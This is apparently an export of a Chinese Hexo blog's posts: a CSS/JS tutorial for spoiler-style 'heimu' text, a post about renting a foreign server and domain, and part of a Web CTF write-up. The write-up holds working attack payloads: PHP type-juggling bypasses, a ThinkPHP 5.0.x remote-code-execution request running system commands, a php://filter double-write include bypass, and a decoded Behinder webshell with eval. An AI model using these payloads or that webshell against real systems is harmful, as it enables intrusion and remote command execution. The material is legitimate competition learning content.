class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以<kbd>ctrl</kbd>+<kbd>f</kbd>搜索上面那两个<code>..refreshFn</code>函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的<code>addheimuTitle</code>函数在这里面调用。我盲猜的嗷<code>refreshFn</code>这个函数是在载入页面会调用，直接在里面第二行加上</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120173713.png\"></p>\n<h2 id=\"修改删除线\"><a href=\"#修改删除线\" class=\"headerlink\" title=\"修改删除线\"></a>修改删除线</h2><p>​    修改<code>css\\_layout\\post.styl</code>文件，在文件中找到id为<code>#article-container</code>的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-id\">#article-container</span> </span><br><span class=\"line\">.....</span><br><span class=\"line\">.....</span><br><span class=\"line\">  <span class=\"selector-tag\">del</span></span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#252525</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#252525</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-shadow</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: none</span><br><span class=\"line\">    <span class=\"selector-pseudo\">&amp;:hover</span></span><br><span class=\"line\">      <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​    因为文章中的删除线被渲染以后页面的标签为<code>&lt;del&gt;</code>，选中id为<code>article-container</code>下的所有<code>del</code>标签添加样式，剩下的还有在<code>main.js</code>中添加<code>title</code>和上面的方法差不多，只需要把选择器修改为<code>$(&#39;#article-container del&#39;).attr(&#39;title&#39;,&#39;你知道的太多了&#39;)</code>。</p>\n<h2 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h2><p>​    两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    老早就觉得<a href=\"https://zh.moegirl.org.cn/Mainpage\">萌娘百科</a>里的<span class='heimu'>黑幕</span>很好玩，所以摸索着给自己博客加了一个。参考博客<a href=\"https://www.cnblogs.com/send-off-a-friend/p/12355387.html\">Re：萌娘百科上的黑幕实现</a>。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线<code>~~ ~~</code>标签修改了。我回来又想到了更好的方法，markdown支持文章中的<strong>自定义标签</strong>，自己增加一个<code>&lt;span class=&#39;heimu&#39;&gt;...&lt;/span&gt;</code>标签更好。那么两种都记一下吧。当然用<strong>自定义标签</strong>的话还可以保留<strong>删除线</strong>。</p>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><p><span class='heimu'>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</span></p>\n<p><span class='heimu'><a href=\"\">我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</a></span></p>\n<p><span class='heimu'><del>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</del></span></p>\n<p><span class='heimu'><strong>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</strong></span></p>\n<p><span class='heimu'><code>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</code></span></p>\n<p>原博客图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210818171850.png\"></p>\n<p>萌娘百科<a href=\"https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95\">官方介绍</a></p>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>​    先进入主题的资源文件夹<code>themes\\butterfly\\source\\</code>，修改需要用到的文件<code>css\\_global\\index.styl</code>、<code>js/main.js</code>。</p>\n<p>​    说明一下两个文件的作用：主题的总样式表<code>index.css</code>是经过整合形成的，而<strong>.styl文件是基于Node.js的CSS的预处理框架</strong>，我们会在这个里面添加黑幕的样式。<code>main.js</code>里面使用选择器为标签添加<code>title=&#39;你知道的太多了&#39;</code>，这个可以修改成自己喜欢的。</p>\n<h2 id=\"修改自定义标签\"><a href=\"#修改自定义标签\" class=\"headerlink\" title=\"修改自定义标签\"></a>修改自定义标签</h2><ol>\n<li>在<code>index.styl</code>文件末尾添加</li>\n</ol>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span> <span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">a</span><span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">code</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#252525</span> <span class=\"meta\">!important</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#252525</span> <span class=\"meta\">!important</span></span><br><span class=\"line\">  <span class=\"attribute\">text-shadow</span>: none</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span>,<span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">code</span><span class=\"selector-pseudo\">:hover</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span> </span><br><span class=\"line\">  <span class=\"attribute\">color</span>: lightblue <span class=\"meta\">!important</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:active</span>, <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#BA0000</span> <span class=\"meta\">!important</span>;</span><br></pre></td></tr></table></figure>\n\n<p>因为是<code>.styl</code>的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。</p>\n<ol start=\"2\">\n<li>在<code>main.js</code>的<code>unRefreshFn</code>和<code>refreshFn</code>方法之前定义<code>addheimuTitle</code>函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//你知道的太多了</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> addheimuTitle = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">123</span>)</span><br><span class=\"line\">  $(<span class=\"string\">&#x27;.heimu&#x27;</span>).attr(<span class=\"string\">&#x27;title&#x27;</span>,<span class=\"string\">&#x27;你知道的太多了&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以<kbd>ctrl</kbd>+<kbd>f</kbd>搜索上面那两个<code>..refreshFn</code>函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的<code>addheimuTitle</code>函数在这里面调用。我盲猜的嗷<code>refreshFn</code>这个函数是在载入页面会调用，直接在里面第二行加上</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120173713.png\"></p>\n<h2 id=\"修改删除线\"><a href=\"#修改删除线\" class=\"headerlink\" title=\"修改删除线\"></a>修改删除线</h2><p>​    修改<code>css\\_layout\\post.styl</code>文件，在文件中找到id为<code>#article-container</code>的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-id\">#article-container</span> </span><br><span class=\"line\">.....</span><br><span class=\"line\">.....</span><br><span class=\"line\">  <span class=\"selector-tag\">del</span></span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#252525</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#252525</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-shadow</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: none</span><br><span class=\"line\">    <span class=\"selector-pseudo\">&amp;:hover</span></span><br><span class=\"line\">      <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​    因为文章中的删除线被渲染以后页面的标签为<code>&lt;del&gt;</code>，选中id为<code>article-container</code>下的所有<code>del</code>标签添加样式，剩下的还有在<code>main.js</code>中添加<code>title</code>和上面的方法差不多，只需要把选择器修改为<code>$(&#39;#article-container del&#39;).attr(&#39;title&#39;,&#39;你知道的太多了&#39;)</code>。</p>\n<h2 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h2><p>​    两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。</p>\n"},{"title":"造窝过程(一)","date":"2020-09-02T03:14:35.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120848.jpg","_content":"\n- 备案劝退\n\n很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息>>>阿里云审核通过>>>工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？![BJ9L8g.jpg](https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg)看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。\n\n- 选择服务器\n\n听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：[vultr](https://www.vultr.com/)、[搬瓦工](https://bwh88.net/)、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的[pacificrack](https://www.pacificrack.com/),看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！\n\n- 域名注册\n\n服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商[freenom](www.freenom.com)，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。\n\n到这服务器和域名都搞定了。\n\n","source":"_posts/造窝过程-(一).md","raw":"---\ntitle: 造窝过程(一)\ndate: 2020-09-02 11:14:35\ncategories: \n - 流水账\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120848.jpg\n---\n\n- 备案劝退\n\n很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息>>>阿里云审核通过>>>工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？![BJ9L8g.jpg](https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg)看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。\n\n- 选择服务器\n\n听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：[vultr](https://www.vultr.com/)、[搬瓦工](https://bwh88.net/)、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的[pacificrack](https://www.pacificrack.com/),看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！\n\n- 域名注册\n\n服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商[freenom](www.freenom.com)，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。\n\n到这服务器和域名都搞定了。\n\n","slug":"造窝过程-(一)","published":1,"updated":"2021-12-30T09:42:54.204Z","_id":"ckrr3f9bf0025hotcbyuwegq3","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li>备案劝退</li>\n</ul>\n<p>很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&gt;&gt;&gt;阿里云审核通过&gt;&gt;&gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？<img src=\"https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg\" alt=\"BJ9L8g.jpg\">看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。</p>\n<ul>\n<li>选择服务器</li>\n</ul>\n<p>听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：<a href=\"https://www.vultr.com/\">vultr</a>、<a href=\"https://bwh88.net/\">搬瓦工</a>、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的<a href=\"https://www.pacificrack.com/\">pacificrack</a>,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！</p>\n<ul>\n<li>域名注册</li>\n</ul>\n<p>服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商<a href=\"www.freenom.com\">freenom</a>，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。</p>\n<p>到这服务器和域名都搞定了。</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>备案劝退</li>\n</ul>\n<p>很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&gt;&gt;&gt;阿里云审核通过&gt;&gt;&gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？<img src=\"https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg\" alt=\"BJ9L8g.jpg\">看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。</p>\n<ul>\n<li>选择服务器</li>\n</ul>\n<p>听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：<a href=\"https://www.vultr.com/\">vultr</a>、<a href=\"https://bwh88.net/\">搬瓦工</a>、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的<a href=\"https://www.pacificrack.com/\">pacificrack</a>,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！</p>\n<ul>\n<li>域名注册</li>\n</ul>\n<p>服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商<a href=\"www.freenom.com\">freenom</a>，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。</p>\n<p>到这服务器和域名都搞定了。</p>\n"},{"title":"DMCTF之Web","date":"2020-11-29T15:17:50.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232346.png","_content":"\n# 前言\n\n比赛地址：[http://dmctf.vaala.cloud:81](http://dmctf.vaala.cloud:81/)\n\n这次先写Web题目部分，我最后的排名：\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png)\n\n# Web\n\n## weak_type\n\n源码：\n\n```\nPHP\n<?php\n\nshow_source(__FILE__);\ninclude('class.php');\n\n//level1 \n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"202020020\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===202020020){\n        echo \"<br> level 1 Ok <br>\";\n    }else{\n        die('what are you doing?');\n    }\n}else{\n    die();\n}\n\n//level 2\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if($v1 != $v2 && md5($v1)==md5($v2)){\n        echo \"<br> level 2 Ok <br>\";\n    }else{\n        die('Are you kidding me ?');\n    }\n}else{\n    die();\n}\n\n//level 3 \n\nif (isset($_POST['message'])) {\n    $message = json_decode($_POST['message']);\n    if ($message->key == $key) {\n        echo \"<br> Wow you got it !!! <br>\";\n        echo file_get_contents('/flag');\n    } \n    else {\n        die(\"fail\");\n    }\n }\nelse{\n     echo \"~~~~\";\n }\n```\n\n **第一关**利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造`num=202020020a`，即可。\n\n> intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞\n\n **第二关**利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：`v1=QNKCDZO&v2=240610708`，这篇博客中还进一步的讲解了一些[md5函数的漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)。\n\n **第三关**进行`$message->key`和`$key`进行判断，`$key`之前没有声明过故值为空，所以传入的`message`也为空即可。post中传入`message=` 即可。\n\n**完整payload**：\n\nurl: `http://dmctf.vaala.cloud:28113/?num=202020020a&v1=QNKCDZO&v2=240610708`\n\npost: `message=`\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png)\n\n## thinkphp\n\n 看到框架首先去搜索框架的漏洞，参考了[[框架漏洞\\]Thinkphp系列漏洞【截至2020-07-20】](https://blog.csdn.net/qq_37865996/article/details/107468816)\n\n 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对`$_POST[‘_method’]`属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。\n\n测试payload：\n\n**url**： `?s=captcha`\n\n**post**： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami`\n\n虽然报错但是最上方输出了`www-data`\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png)\n\n根据题目中的提示**flag在环境变量中**，所以在网上查询linux系统输出环境变量的语句：\n\n```\nSHELL\nenv\n```\n\n最终获取到flag的payload：\n\nurl： `?s=captcha`\n\npost： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=env`\n\n在输出末尾即是flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png)\n\n## fungame\n\n 打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。\n\n我先下了源码到本地康一康，查看源码在`game.js`中第122行中：\n\n```\nJAVASCRIPT\nnextLevel = (nextLevel+1)%11;\n```\n\n `nextlevel`根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：\n\n```\nJAVASCRIPT\nclass PlayerData\n{\n    // track player data between levels (when player is destroyed)\n    constructor()\n    {\n        this.health = 3;\n        this.healthMax = 3;\n        this.boomerangs = 1;\n        this.bigBoomerangs = 0;\n        this.coins = 0;\n    }\n}\n```\n\n 人物属性值中的`health`、`healthMax`、`bigBoomerangs`数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。\n\n 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg)\n\n## bingxie\n\n 首先根据提示：**你需要一些特殊软件**，再看题目联想到[Behinder](https://github.com/rebeyond/Behinder/releases)，首先下载工具。\n\n分析题目：\n\n源码：\n\n```\nPHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file) //hint in bingxie.php\n{\n    $file = strtolower($file);\n    $file = str_replace('php', \"\", $file);\n    $file = str_replace('data', \"???\", $file);\n    $file = str_replace('http', \"???\", $file);\n    $file = str_replace('file', \"???\", $file);\n    $file = str_replace('input', \"???\", $file);\n    $file = str_replace('filter', \"\", $file);\n    $file = str_replace('log',\"???\",$file);\n    return $file;\n}\n$file = $_GET['file'];\n$md5 =substr(md5($_GET['md5']),0,6);\n\n$file = filter($file);\nif ($md5=='e95100')\n{\n  include $file;\n}\n?>\n```\n\n 代码16、17行使用GET方法获得`file`和`md5`参数，`file`经过filter函数过滤一些PHP协议，`md5`参数进行md5加密并截取前6位，判断是否为`e95100`，如果判定成功include包含`file`变量指定的文件。\n\n 首先计算什么数进行md5加密后前六位是`e95100`。参考了[Getting MD5 with certain character pattern](https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern)中的回答，使用脚本：\n\n```\nPYTHON\nimport hashlib\n\ntarget = 'e95100'\ncandidate = 0\nwhile True:\n    plaintext = str(candidate)\n    hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if hash[:6] == target:\n        print('plaintext:\"' + plaintext + '\", md5:' + hash)\n        break\n    candidate = candidate + 1\n```\n\n 运行之后很快得出md5加密后前六位是`e95100`的数字是`6666`。\n\n 再根据提示`hint in bingxie.php`，直接访问`/bingxie.php`只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为`str_replace`函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：\n\n```\nCODE\nhttp://网址?md5=6666&file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp\n```\n\n 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的[github项目地址](https://github.com/gchq/CyberChef)）：\n\n```\nCODE\nPD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==\n```\n\n 解码后得到一个php文件：\n\n```\nPHP\n<?php\n@error_reporting(0);\nsession_start();\n//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中\n$a = $_GET['a'];\n$b = $_GET['b'];\nif($a!=$b&&md5($a)==md5($b))\n{\n    echo \"you are right\";\n}\nelse{\n    die(\"no ,you are not a real hacker !!!\");\n}\n\nif (isset($_GET['secret']))\n{\n    $key=substr(md5(uniqid(rand())),16);\n    $_SESSION['k']=$key;\n    print $key;\n}\n\nelse\n{\n    $key=$_SESSION['k'];\n\n    $post=file_get_contents(\"php://input\");\n\n    if(!extension_loaded('openssl'))\n    {\n        $t=\"base64_\".\"decode\";\n        $post=$t($post.\"\");\n        \n        for($i=0;$i<strlen($post);$i++) {\n                 $post[$i] = $post[$i]^$key[$i+1&15];\n                }\n    }\n\n    else\n    {\n        $post=openssl_decrypt($post, \"AES128\", $key);\n    }\n\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n    class C{public function __construct($p) {eval($p.\"\");}}\n\n    @new C($params);\n}\n?>\n```\n\n 